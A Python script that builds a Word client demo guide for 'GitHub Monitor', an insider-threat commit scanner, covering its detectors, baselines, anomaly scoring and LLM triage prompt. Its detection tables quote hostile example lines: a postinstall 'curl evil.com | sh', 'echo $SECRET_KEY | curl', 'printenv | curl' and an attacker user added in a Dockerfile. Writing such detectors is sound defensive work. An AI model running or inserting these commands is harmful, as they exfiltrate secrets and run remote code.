"""Generate GitHub Monitor — Client Demo Guide as Word (.docx)"""

import os
from docx import Document
from docx.shared import Pt, Cm, RGBColor
from docx.enum.text import WD_ALIGN_PARAGRAPH
from docx.enum.table import WD_TABLE_ALIGNMENT
from docx.oxml.ns import qn

doc = Document()

# ── Page margins ──
for section in doc.sections:
    section.top_margin = Cm(2.2)
    section.bottom_margin = Cm(2.2)
    section.left_margin = Cm(2.2)
    section.right_margin = Cm(2.2)

# ── Styles ──
style = doc.styles['Normal']
style.font.name = 'Calibri'
style.font.size = Pt(11)
style.paragraph_format.space_after = Pt(6)

for level in range(1, 4):
    h = doc.styles[f'Heading {level}']
    h.font.name = 'Calibri'
    h.font.color.rgb = RGBColor(0x1a, 0x1a, 0x2e)

doc.styles['Heading 1'].font.size = Pt(20)
doc.styles['Heading 2'].font.size = Pt(15)
doc.styles['Heading 3'].font.size = Pt(12)


def add_code_block(text):
    p = doc.add_paragraph()
    p.paragraph_format.space_before = Pt(6)
    p.paragraph_format.space_after = Pt(6)
    p.paragraph_format.left_indent = Cm(0.4)
    run = p.add_run(text)
    run.font.name = 'Consolas'
    run.font.size = Pt(9)
    run.font.color.rgb = RGBColor(0x2d, 0x2d, 0x2d)
    shading = run._element.get_or_add_rPr()
    shd = shading.makeelement(qn('w:shd'), {
        qn('w:val'): 'clear', qn('w:color'): 'auto', qn('w:fill'): 'F5F5F5'
    })
    shading.append(shd)
    return p


def add_table(headers, rows, col_widths=None):
    table = doc.add_table(rows=1 + len(rows), cols=len(headers))
    table.style = 'Light Grid Accent 1'
    table.alignment = WD_TABLE_ALIGNMENT.CENTER

    for i, h in enumerate(headers):
        cell = table.rows[0].cells[i]
        cell.text = h
        for p in cell.paragraphs:
            p.alignment = WD_ALIGN_PARAGRAPH.LEFT
            for run in p.runs:
                run.bold = True
                run.font.size = Pt(10)

    for r_idx, row in enumerate(rows):
        for c_idx, val in enumerate(row):
            cell = table.rows[r_idx + 1].cells[c_idx]
            cell.text = str(val)
            for p in cell.paragraphs:
                for run in p.runs:
                    run.font.size = Pt(10)

    doc.add_paragraph()
    return table


def add_bullet(text, bold_prefix=None):
    p = doc.add_paragraph(style='List Bullet')
    if bold_prefix:
        run = p.add_run(bold_prefix)
        run.bold = True
        p.add_run(text)
    else:
        p.add_run(text)
    return p


def add_para(text):
    doc.add_paragraph(text)


# ══════════════════════════════════════════════════════════════════════
# COVER PAGE
# ══════════════════════════════════════════════════════════════════════
doc.add_paragraph(); doc.add_paragraph(); doc.add_paragraph()
title = doc.add_paragraph()
title.alignment = WD_ALIGN_PARAGRAPH.CENTER
run = title.add_run('GitHub Monitor')
run.font.size = Pt(34); run.bold = True
run.font.color.rgb = RGBColor(0x1a, 0x1a, 0x2e)

subtitle = doc.add_paragraph()
subtitle.alignment = WD_ALIGN_PARAGRAPH.CENTER
run = subtitle.add_run('Insider Threat Detection\nClient Demo Guide')
run.font.size = Pt(18); run.font.color.rgb = RGBColor(0x4a, 0x4a, 0x6a)

doc.add_paragraph()
meta = doc.add_paragraph()
meta.alignment = WD_ALIGN_PARAGRAPH.CENTER
run = meta.add_run('AppSec Platform\nDemo-ready walkthrough including full AI prompts')
run.font.size = Pt(12); run.font.color.rgb = RGBColor(0x88, 0x88, 0x88)

doc.add_page_break()

# ══════════════════════════════════════════════════════════════════════
# 1. 30-SECOND PITCH
# ══════════════════════════════════════════════════════════════════════
doc.add_heading('1. What it is (30-second pitch)', level=1)
add_para(
    "The GitHub Monitor watches your organisation's repositories in real time and scores every "
    "commit for insider-threat risk. It combines:"
)
add_bullet('10 deterministic rule-based detectors (code patterns, sensitive files, supply-chain tampering, CI/CD sabotage, config weakening)', '1. ')
add_bullet('Per-developer behavioural baselines (what does "normal" look like for this developer?)', '2. ')
add_bullet('Statistical anomaly detection (z-score against baseline)', '3. ')
add_bullet('On-demand AI threat assessment (LLM classifies intent: intentional insider / suspicious / negligent / false positive)', '4. ')
add_para(
    "The output is a prioritised feed of commits your security team can actually investigate — "
    "not thousands of raw findings."
)

# ══════════════════════════════════════════════════════════════════════
# 2. PROBLEM WE SOLVE
# ══════════════════════════════════════════════════════════════════════
doc.add_heading('2. The problem we solve', level=1)
add_para("Traditional SAST tools look at code. They miss the human signals:")
add_table(
    ['Signal the SAST misses', 'What the GitHub Monitor catches'],
    [
        ['A developer commits at 3 AM — their first ever night-time commit', 'Baseline deviation → flagged'],
        ['Someone renames .env in .gitignore so secrets get tracked', 'Config-weakening detector → flagged'],
        ['A PR removes "snyk scan" from .github/workflows/ci.yml', 'CI/CD tampering detector → flagged'],
        ['package.json suddenly pulls from a random registry URL', 'Dependency tampering → flagged'],
        ['Commit message says "fix" but touches 800 lines across 40 files', 'Suspicious-message + large-commit anomaly'],
        ["A dev's risk score jumps from 0.5 to 8.0 on one commit", 'Risk-spike anomaly'],
    ]
)
add_para("This is the insider-threat layer that lives on top of normal SAST.")

doc.add_page_break()

# ══════════════════════════════════════════════════════════════════════
# 3. PIPELINE
# ══════════════════════════════════════════════════════════════════════
doc.add_heading('3. End-to-end pipeline', level=1)
add_code_block(
    '[Stage 1]  Connect to GitHub   (PAT auth, add repos)\n'
    '    |\n'
    '    v\n'
    '[Stage 2]  Commit Scan         (10 deterministic detectors -> risk score 0-10)\n'
    '    |\n'
    '    v\n'
    '[Stage 3]  Baseline Engine     (rolling 60-commit window per developer)\n'
    '    |\n'
    '    v\n'
    '[Stage 4]  Anomaly Detection   (z-score vs baseline -> off-hours, size, risk spike)\n'
    '    |\n'
    '    v\n'
    '[Stage 5]  AI Threat Assessment  (on-demand, one click in the UI)'
)
add_para(
    "Stages 1-4 run automatically on every commit. Stage 5 is triggered by the analyst on commits "
    "they want to investigate deeper."
)

# ══════════════════════════════════════════════════════════════════════
# 4. STAGE 1
# ══════════════════════════════════════════════════════════════════════
doc.add_heading('4. Stage 1 — Connect to GitHub', level=1)
add_bullet('User stores a GitHub Personal Access Token (PAT) in Settings (masked, marked as secret).')
add_bullet('User adds repositories by owner/repo name.')
add_bullet('"Scan Now" pulls the full commit history; afterwards incremental scans only fetch new commits.')

doc.add_heading('Key GitHub API endpoints used', level=3)
add_table(
    ['Endpoint', 'Purpose'],
    [
        ['GET /user', 'Validate PAT on connection test'],
        ['GET /repos/{owner}/{repo}/commits', 'List commits on default branch'],
        ['GET /repos/{owner}/{repo}/commits/{sha}', 'Commit detail + file stats'],
        ['GET /repos/{owner}/{repo}/commits/{sha} (Accept: diff)', 'Raw unified diff'],
    ]
)

doc.add_page_break()

# ══════════════════════════════════════════════════════════════════════
# 5. STAGE 2 — 10 DETECTORS
# ══════════════════════════════════════════════════════════════════════
doc.add_heading('5. Stage 2 — The 10 Detectors (deterministic)', level=1)
add_para(
    "Every commit runs through these in order. No AI is involved in this stage — it's "
    "deterministic and auditable."
)

# 5.1
doc.add_heading('5.1 Metadata signals', level=2)
add_para("Looks at the commit envelope, not the code.")
add_table(
    ['Signal', 'Detection', 'Score'],
    [
        ['off_hours', 'Commit time < 07:00 or ≥ 21:00 UTC', '+1.0'],
        ['author_committer_mismatch', 'Author email ≠ committer email (ignoring noreply@)', '+1.5'],
        ['unsigned_commit', 'GPG verification.verified is false', '+0.5'],
        ['force_push', 'Caller flags force push', '+2.0'],
        ['large_deletion', 'More than 500 lines deleted', '+1.0'],
    ]
)

# 5.2
doc.add_heading('5.2 SAST rules on the diff', level=2)
add_para(
    "The scanner loads every enabled rule from the custom_rules table with "
    "category='insider_threat' and runs each pattern against every added line (+) in the diff. "
    "For each match it captures: rule name, severity, CWE, OWASP reference, file path, line "
    "number, matched text (≤200 chars), and a ±5-line diff snippet for analyst context."
)
add_table(
    ['Severity', 'Score per finding'],
    [['Critical', '+2.5'], ['High', '+1.5'], ['Medium / Low', '+0.5']]
)

# 5.3
doc.add_heading('5.3 Sensitive file detection', level=2)
add_para("Pattern-matches every touched filename.")
add_table(
    ['Category', 'Patterns'],
    [
        ['Environment files', '.env, .env.*'],
        ['Secrets', 'secret, password, .htpasswd'],
        ['SSH keys', 'id_rsa, id_dsa, id_ecdsa, id_ed25519, authorized_keys'],
        ['Certificates', '.pem, .pfx, .p12, .key'],
        ['Cloud credentials', 'aws_credentials, credentials.json, token.json'],
        ['Password stores', '.kdbx, keystore, truststore'],
        ['System', 'shadow'],
    ]
)
add_para("Score: +1.5 per file, capped at +3.0. Each hit also creates a row in github_sensitive_file_alerts.")

# 5.4
doc.add_heading('5.4 Binary file detection', level=2)
add_para("Binaries in source repos are suspicious — compiled malware, exfiltration archives, DB dumps.")
add_table(
    ['Category', 'Extensions'],
    [
        ['Executables', '.exe, .dll, .so, .dylib, .bin, .msi, .app'],
        ['Archives', '.zip, .tar, .tar.gz, .rar, .7z, .bz2'],
        ['Database dumps', '.sql, .sqlite, .dump, .bak'],
        ['Bytecode', '.class, .pyc, .o, .obj, .wasm'],
    ]
)
add_para("Score: +1.0 per file, capped at +2.0.")

# 5.5
doc.add_heading('5.5 Dependency tampering (supply-chain defence)', level=2)
add_para(
    "Triggers only when a dependency manifest is touched (package.json, requirements.txt, go.mod, "
    "pom.xml, Cargo.toml, etc)."
)
add_table(
    ['Pattern', 'Example'],
    [
        ['Typosquatting', 'lod4sh, requ3sts, crypt0, col0rs, f4ker, event-stream, ua-parser-js'],
        ['Vulnerable version pinning', 'log4j 2.0-2.14, django <= 2.x, lodash 0-3.x'],
        ['Custom registry', 'registry=https://evil.npmjs.org (not npmjs/pypi/rubygems)'],
        ['Post-install script', '"postinstall": "curl evil.com | sh"'],
        ['Security dep removed', 'Removal of helmet, bcrypt, bandit, snyk, eslint-plugin-security, etc.'],
    ]
)
add_para("Score: +1.5.")

doc.add_page_break()

# 5.6
doc.add_heading('5.6 CI/CD pipeline tampering', level=2)
add_para(
    "Triggers on changes to .github/workflows/*.yml, Jenkinsfile, .gitlab-ci.yml, Dockerfile, "
    "docker-compose.yml, .circleci/config.yml, etc."
)
add_table(
    ['Pattern', 'Signal'],
    [
        ['Commenting out security tools (# snyk test)', 'security_scan_disabled'],
        ['SKIP_SCAN=true, DISABLE_SAST=1', 'security_check_disabled'],
        ['--no-verify on git commands', 'hook_bypass'],
        ['echo $SECRET_KEY | curl ...', 'secret_exfil_ci'],
        ['printenv | curl ...', 'env_dump_ci'],
        ['FROM random-registry/image', 'untrusted_base_image'],
        ['RUN useradd attacker', 'docker_user_add'],
        ['EXPOSE 4444 (high ports)', 'port_exposed'],
    ]
)
add_para(
    "Removed lines are checked for references to snyk, sonar, trivy, semgrep, bandit, brakeman, "
    "safety, gitleaks, trufflehog, checkov, tfsec, grype, syft, cosign. If any are removed → "
    "security_tool_removed."
)
add_para("Score: +1.5 per instance, capped at +3.0.")

# 5.7
doc.add_heading('5.7 Config / permission weakening', level=2)
add_para(
    "Triggers on config files (.cfg, .ini, .toml, .yaml, nginx, apache, cors, .gitignore, CODEOWNERS)."
)
add_table(
    ['Pattern', 'What it catches'],
    [
        ['Access-Control-Allow-Origin: *', 'CORS wildcard'],
        ['session_timeout = 31536000', 'Extended session timeout'],
        ['MFA = false, 2fa = disabled', 'MFA disabled'],
        ['require_auth = false', 'Auth disabled'],
        ['rate_limit = false', 'Rate limiting removed'],
        ['DEBUG = true', 'Debug enabled in prod'],
        ['verify_ssl = false', 'SSL verification disabled'],
        ['TLS = 1.0, ssl = SSLv3', 'Weak TLS'],
    ]
)
add_para(
    ".gitignore: if rules for .env, .pem, .key, secret, credential, token are removed, previously "
    "ignored secrets could now be tracked → gitignore_sensitive_unignored."
)
add_para(
    "CODEOWNERS: any removed line weakens code-review protection → codeowner_removed."
)
add_para("Score: +1.0 per instance, capped at +2.0.")

# 5.8
doc.add_heading('5.8 Suspicious commit messages', level=2)
add_para("On commits with more than 50 lines changed:")
add_bullet('Empty / near-empty message (".", "..", "ok") → suspicious_message:empty', '• ')
add_bullet('Vague single word (fix, update, wip, tmp, stuff, asdf) → suspicious_message:vague', '• ')
add_para("Score: +0.5.")

# 5.9
doc.add_heading('5.9 Final risk score', level=2)
add_para("All signal scores sum up, cap at 10.0, and map to a level:")
add_table(
    ['Score', 'Level', 'UI colour', 'Meaning'],
    [
        ['≥ 7.0', 'Critical', 'Red', 'Immediate review required'],
        ['≥ 4.0', 'High', 'Orange', 'Priority investigation'],
        ['≥ 2.0', 'Medium', 'Yellow', 'Monitor and review'],
        ['≥ 0.5', 'Low', 'Blue', 'Informational'],
        ['< 0.5', 'Clean', 'Green', 'No action'],
    ]
)

doc.add_page_break()

# ══════════════════════════════════════════════════════════════════════
# 6. STAGE 3
# ══════════════════════════════════════════════════════════════════════
doc.add_heading('6. Stage 3 — Behavioural Baselines', level=1)
add_para(
    "For each developer, a rolling window of their last 60 commits is used to compute what "
    "'normal' looks like."
)

add_table(
    ['Metric', 'How it is computed'],
    [
        ['mean_commit_hour', 'Arithmetic mean of UTC hours across the window'],
        ['std_commit_hour', 'Standard deviation (floor 1.0 to avoid div-by-zero)'],
        ['typical_hour_start / end', 'mean ± 1.5 × std, clamped to 0-23'],
        ['avg_additions / deletions / files_changed', 'Simple mean'],
        ['p90_additions / p90_deletions', '90th percentile'],
        ['avg_risk_score', 'Mean of historical risk scores'],
        ['avg_commits_per_week', 'n / (span_days / 7)'],
    ]
)

doc.add_heading('Baseline status', level=2)
add_table(
    ['Status', 'Commits in window', 'What anomaly detection does'],
    [
        ['insufficient', '< 5', 'Nothing — no detection yet'],
        ['partial', '5-19', 'Simple hour-range check (low severity only)'],
        ['established', '≥ 20', 'Full z-score analysis (medium / high severity)'],
    ]
)

add_para(
    "Critical ordering: when a new commit arrives, anomalies are detected against the existing "
    "baseline first, THEN the baseline is updated. Otherwise the anomaly would contaminate the "
    "baseline it is compared against."
)

# ══════════════════════════════════════════════════════════════════════
# 7. STAGE 4
# ══════════════════════════════════════════════════════════════════════
doc.add_heading('7. Stage 4 — Anomaly Detection', level=1)
add_table(
    ['Anomaly', 'Trigger', 'Severity'],
    [
        ['off_hours_deviation (established)', 'z-score |hour - mean| / std ≥ 2.0', 'medium (z ≥ 2), high (z ≥ 3)'],
        ['off_hours_deviation (partial)', 'hour outside [typical_start, typical_end]', 'low'],
        ['large_commit_additions', 'additions > 5× avg_additions (and avg > 20 lines)', 'medium (5-10×), high (>10×)'],
        ['large_commit_deletions', 'deletions > 5× avg_deletions (and avg > 20 lines)', 'medium (5-10×), high (>10×)'],
        ['risk_spike', 'risk_score ≥ 2.5 AND risk_score > 3× avg_risk_score', 'high'],
    ]
)
add_para(
    "Worked example: a developer whose mean commit time is 13:00 ± 2h has a normal window of "
    "10:00-16:00. A commit at 03:00 gives z = |3 − 13| / 2 = 5.0 → high severity."
)

doc.add_page_break()

# ══════════════════════════════════════════════════════════════════════
# 8. STAGE 5 — AI
# ══════════════════════════════════════════════════════════════════════
doc.add_heading('8. Stage 5 — AI Threat Assessment (the LLM step)', level=1)
add_para(
    "This is the only place an LLM is called in the pipeline. It runs on-demand when an analyst "
    "clicks 'AI Analyze' on a commit in the UI."
)
add_para("Source: backend/routers/github_monitor.py (endpoint POST /api/github-monitor/commits/{scan_id}/ai-analyze).")

doc.add_heading('8.1 Why it exists', level=2)
add_para(
    "Stages 2-4 tell you WHAT is unusual. The AI step tells you WHAT IT PROBABLY MEANS in plain "
    "English — impact, likely intent, and recommended actions — so an analyst can triage faster."
)

doc.add_heading('8.2 The exact prompts', level=2)
add_para(
    "The system uses two prompts passed to chat_completion with temperature = 0.3 (low for "
    "consistency) and max_tokens = 1500."
)

doc.add_heading('System prompt (fixed)', level=3)
add_code_block(
    'You are a cybersecurity expert specializing in insider threat analysis.\n'
    'Respond only with valid JSON.'
)

doc.add_heading('User prompt (templated per commit)', level=3)
add_code_block(
    'You are a senior application security analyst specializing in insider threat detection.\n\n'
    'Analyze the following git commit and provide a structured threat assessment.\n\n'
    '## Commit Details\n'
    '- **Repository**: {repo_full_name}\n'
    '- **SHA**: {sha[:12]}\n'
    '- **Author**: {author_name} <{author_email}>\n'
    '- **Committer**: {committer_name} <{committer_email}>\n'
    '- **Message**: {commit_message}\n'
    '- **Committed at**: {committed_at}\n'
    '- **Risk Score**: {risk_score}/10 ({risk_level})\n'
    '- **Files changed**: {files_changed} (+{additions} / -{deletions} lines)\n\n'
    '## Behavioral Signals\n'
    '{signal_text}   <-- comma-joined, e.g. "off_hours, unsigned_commit, sensitive_files:2"\n\n'
    '## SAST Findings ({count} total)\n'
    '  - [{SEVERITY}] {rule_name} in {file_path} line {line_number}\n'
    '    Code: `{matched_text[:300]}`\n'
    '    Rule: {rule_description}  CWE: {cwe}  OWASP: {owasp}\n'
    '  ... (one block per finding)\n\n'
    '## Sensitive Files Touched ({count} total)\n'
    '  - {file_path} (matched pattern: {pattern_matched})\n'
    '  ... (one line per alert)\n\n'
    '---\n\n'
    'Respond ONLY with a valid JSON object (no markdown fences) matching this schema:\n'
    '{\n'
    '  "threat_level": "intentional_insider" | "suspicious" | "negligent" | "false_positive",\n'
    '  "confidence": 0.0-1.0,\n'
    '  "impact_summary": "2-3 sentence description of the real-world security impact",\n'
    '  "intent_analysis": "2-3 sentence analysis of whether this looks intentional, accidental, or benign",\n'
    '  "malicious_scenario": "If this were malicious, describe the most likely attack scenario in 2-3 sentences. Write null if confidence < 0.3.",\n'
    '  "key_indicators": ["indicator 1", "indicator 2", ...],\n'
    '  "recommended_actions": ["action 1", "action 2", ...]\n'
    '}'
)

doc.add_heading('8.3 What the AI returns', level=2)
add_para("A strict JSON object that is parsed and stored in github_commit_ai_analysis:")
add_table(
    ['Field', 'Meaning'],
    [
        ['threat_level', 'One of four classes (see 8.4)'],
        ['confidence', '0.0-1.0 — how sure the model is'],
        ['impact_summary', 'Human-readable business impact (2-3 sentences)'],
        ['intent_analysis', 'Intentional vs accidental analysis'],
        ['malicious_scenario', 'Hypothetical attack chain, or null if low confidence'],
        ['key_indicators', 'Bullet list of the specific signals that drove the verdict'],
        ['recommended_actions', 'What the analyst should do next'],
    ]
)

doc.add_heading('8.4 Threat levels', level=2)
add_table(
    ['Level', 'Meaning', 'Typical indicators'],
    [
        ['intentional_insider', 'Deliberate malicious action', 'Secret exfiltration, backdoor, security-control bypass'],
        ['suspicious', 'Warrants investigation, intent unclear', 'Unusual patterns, risky changes'],
        ['negligent', 'Unintentional risk from poor practice', 'Hardcoded creds, debug code in prod'],
        ['false_positive', 'Benign, flagged in error', 'Test fixtures, docs, legitimate config'],
    ]
)

doc.add_heading('8.5 Why this design is defensible to a client', level=2)
add_bullet('The risk score the client sees is 100% reproducible and auditable — it does not depend on LLM weather. The AI only adds NARRATIVE on top.', 'Deterministic first, AI second. ')
add_bullet("The AI step is triggered manually, so cost and latency stay predictable.", 'One call per investigation, not per commit. ')
add_bullet("github_commit_ai_analysis has a unique index on scan_id; repeated clicks don't re-bill the LLM.", 'Results are cached. ')
add_bullet("Uses the platform's shared AIConfig.from_user() / get_ai_client() — works with OpenAI, Anthropic, Azure, etc. The model used is recorded per analysis for audit.", 'Provider-agnostic. ')

doc.add_page_break()

# ══════════════════════════════════════════════════════════════════════
# 9. DASHBOARD
# ══════════════════════════════════════════════════════════════════════
doc.add_heading('9. What the analyst sees', level=1)
add_para("The dashboard has 8 tabs. For the demo, focus on these four:")
add_table(
    ['Tab', 'What to show'],
    [
        ['Overview', 'Per-repo risk cards with stacked distribution bars, peak/avg risk score, open alert counts'],
        ['Commit Feed', 'Paginated, filterable feed. Click any row → expandable panel with findings, sensitive files, diff snippet, and the "AI Analyze" button'],
        ['Developers', "Per-developer risk profile. Expand to see the behavioural baseline (typical hours, avg size, avg risk) and anomaly history"],
        ['Anomalies', 'All behavioural anomalies across everyone. Filter by severity. Acknowledgement workflow'],
    ]
)
add_para(
    "Additional tabs: Timeline (14-day heat map), Alerts (sensitive-file acks), Findings (CSV "
    "export for compliance), Repos (add / remove). False positives can be dismissed at finding "
    "level or commit level — the risk level recalculates from remaining non-FP findings."
)

# ══════════════════════════════════════════════════════════════════════
# 10. DEMO SCRIPT
# ══════════════════════════════════════════════════════════════════════
doc.add_heading('10. Suggested demo script (10-12 minutes)', level=1)
add_para("Keep each step tight.")
add_table(
    ['#', 'Step', 'What to say', 'What to click'],
    [
        ['1', 'Hook (30 s)', 'Traditional SAST misses the human signals. We watch commits for insider-threat patterns in addition to vulnerabilities.', 'Show Overview tab'],
        ['2', 'Setup (1 min)', 'Connection is a single GitHub PAT. Add a repo by name. We do the rest.', 'Settings → masked PAT. Repos tab → monitored list'],
        ['3', '10 detectors (2 min)', 'Every commit runs through 10 deterministic detectors — no AI, fully auditable.', 'Open a critical commit. Walk through the signals chips'],
        ['4', 'Diff evidence (1 min)', "We don't just say 'bad' — we show you the exact line and ±5 lines of context.", 'Expand a finding; show diff snippet + CWE/OWASP'],
        ['5', 'Baselines (2 min)', "Static rules miss behaviour. We also learn each developer's normal.", 'Developers tab → expand a dev → typical hours, avg size, avg risk'],
        ['6', 'Anomaly (1 min)', "When someone deviates, we flag it — and show WHY against the baseline.", "Anomalies tab → off_hours_deviation row: 'mean 13:00 ± 2h, committed at 03:00, z-score 5'"],
        ['7', 'AI analyst (2 min)', "On any suspicious commit, one click gives a full analyst narrative: impact, intent, attack scenario, recommended actions.", 'Click AI Analyze. Read impact_summary + malicious_scenario'],
        ['8', 'Export (30 s)', 'Everything exports — findings CSV for compliance, full audit trail of AI decisions per commit.', 'Findings → Export CSV'],
        ['9', 'Close (30 s)', 'Deterministic scoring → reproducible & auditable. AI only adds narrative. Provider-agnostic. Cached per commit.', '—'],
    ]
)

doc.add_page_break()

# ══════════════════════════════════════════════════════════════════════
# 11. Q&A CHEAT SHEET
# ══════════════════════════════════════════════════════════════════════
doc.add_heading('11. Likely client questions & short answers', level=1)
add_table(
    ['Question', 'Answer'],
    [
        ['Does this replace SAST?', "No — it is a layer on top. Your existing SAST rules still run; we also run the insider_threat rule category against every commit diff."],
        ['How do you avoid false positives?', "Three ways: per-signal caps so a single noisy commit cannot dominate; per-developer baselines so 'normal for them' is not flagged; every finding and commit can be marked FP and recalculated."],
        ['Which LLM do you use?', "Whatever the customer configures. Shared AI factory — OpenAI, Anthropic, Azure OpenAI, etc. Model is recorded per analysis for audit."],
        ['Can your AI hallucinate a threat?', "The AI never assigns the risk score — that is deterministic from the rules. The AI only writes narrative after a human clicks 'analyze'. Temperature is 0.3 and the response is JSON-validated."],
        ['What is the latency?', "Deterministic scan: < 1 s per commit. AI step: 3-8 s depending on provider; cached per commit after that."],
        ['What if a developer leaves mid-window?', "Baseline window is rolling over their last 60 commits. When they stop committing, the baseline freezes; old anomalies remain on record."],
        ['How do you handle force pushes and rewritten history?', "Each commit SHA is scanned once (unique index). Force push is a scorable signal when known by the caller."],
        ['What data leaves our network?', "GitHub API calls (diff, metadata) from our backend. The AI step sends the commit summary + findings text to the configured LLM provider — this is the only outbound step and it is opt-in per commit."],
        ['Can we add our own rules?', "Yes. The SAST layer reads from custom_rules with category='insider_threat'. New rules are live immediately, no redeploy."],
        ['What does it cost to run?', "Deterministic stages: just GitHub API quota (no LLM). AI stage: one LLM call per analyst-triggered investigation, cached afterwards."],
    ]
)

# ══════════════════════════════════════════════════════════════════════
# 12. APPENDIX
# ══════════════════════════════════════════════════════════════════════
doc.add_heading('12. Technical appendix — file map', level=1)
add_table(
    ['File', 'Purpose'],
    [
        ['backend/routers/github_monitor.py', 'All API endpoints, scan orchestration, AI prompt (line 1242)'],
        ['backend/services/github_client.py', 'Async GitHub REST client'],
        ['backend/services/commit_analyzer.py', '10-detector risk scoring engine'],
        ['backend/services/baseline_engine.py', 'Behavioural baselines + anomaly detection'],
        ['frontend/src/pages/GitHubMonitorPage.tsx', '8-tab dashboard UI'],
    ]
)

doc.add_heading('Database tables', level=2)
add_para(
    "github_monitored_repos, github_commit_scans, github_commit_findings, "
    "github_sensitive_file_alerts, github_developer_profiles, github_developer_baselines, "
    "github_developer_anomalies, github_commit_ai_analysis."
)

# ── Save ──
out_path = os.path.join(os.path.dirname(__file__), 'GitHub_Monitor_Client_Demo_Guide.docx')
doc.save(out_path)
print(f"Document saved to: {out_path}")
